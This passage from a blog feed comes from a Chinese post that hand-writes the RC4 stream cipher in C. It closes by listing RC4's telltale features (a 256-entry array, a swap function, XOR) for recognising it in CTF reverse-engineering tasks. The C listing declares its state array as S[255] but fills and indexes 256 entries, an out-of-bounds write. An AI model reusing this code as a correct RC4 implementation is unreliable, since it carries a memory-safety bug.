class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="type">int</span> S[<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    S[i]=i;       <span class="comment">//用0~255初始化S数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      j=((j+S[i]+key[i % keylength]) % <span class="number">256</span>);  <span class="comment">//使用密钥进行替换</span></span><br><span class="line">      Swap(&amp;S[i],&amp;S[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> data[]=<span class="string">&quot;mzyloveyy&quot;</span>;</span><br><span class="line">    <span class="type">int</span> datalength=<span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> m=<span class="number">0</span>;m&lt;datalength;m++)</span><br><span class="line">  &#123; </span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    j=(j+S[i])%<span class="number">256</span>;</span><br><span class="line">    Swap(&amp;S[i],&amp;S[j]);</span><br><span class="line">    t=(S[i]+S[j])%<span class="number">256</span>;</span><br><span class="line">    <span class="type">int</span> k=S[t];</span><br><span class="line">    data[m]^=k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,data[m]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>验证一下成果</p><p><img src="/2023/08/20/RC4/QQ%E6%88%AA%E5%9B%BE20230729234509.png"></p><p><img src="/2023/08/20/RC4/QQ%E6%88%AA%E5%9B%BE20230729234535.png"></p><p>okk。</p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h2><p>总结一下，如何在茫茫人海中一眼认出RC4？<strong>256位的数组</strong>，<strong>交换函数</strong>，异或，over。</p><p>手写一遍之后以后遇到魔改的RC4应该就能拿捏了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目中也遇到过很多次RC4了，一般是都是从加密函数的名字看出，现在学习一下，了解其特征，更方便识别出。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;RC4是&lt;strong&gt;对称密码&lt;/strong&gt;算法中的&lt;strong&gt;流密码&lt;/strong&gt;加密算法，对称及加解密的密钥相同，流密码意思是加密是逐字节进行的与之对应的就是&lt;strong&gt;块加密&lt;/strong&gt;。&lt;/p&gt;</summary>
    
    
    
    
    <category term="密码学" scheme="http://example.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="对称加密" scheme="http://example.com/tags/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
</feed>
